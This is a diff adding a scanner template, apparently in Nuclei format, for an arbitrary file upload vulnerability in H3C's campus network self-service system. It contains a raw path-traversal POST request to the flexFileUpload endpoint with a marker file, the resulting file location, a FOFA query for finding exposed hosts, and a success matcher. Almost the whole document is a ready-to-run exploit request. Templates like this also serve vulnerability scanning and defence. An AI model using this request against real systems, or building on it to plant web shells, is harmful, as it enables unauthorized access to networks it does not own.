@@ -1,0 +1,62 @@
+id: poc-foossczvp19iymh9
+info:
+  name: H3C 校园网自助服务系统 flexfileupload 任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/foossczvp19iymh9'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: foossczvp19iymh9
+    fofa: header="/selfservice"
+http:
+- raw:
+  - 'POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
+
+
+    Connection: close
+
+
+    Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    -----------------WebKitFormBoundaryMmx988TUuintqO4Q
+
+
+    Content-Disposition: form-data; name="dudesite.txt"; filename="dudesite.txt"
+
+
+    Content-Type: application/octet-stream
+
+
+
+
+    dudesite
+
+
+    -----------------WebKitFormBoundaryMmx988TUuintqO4Q--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /imc/primepush/%2e%2e/flex/topobg/dudesite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
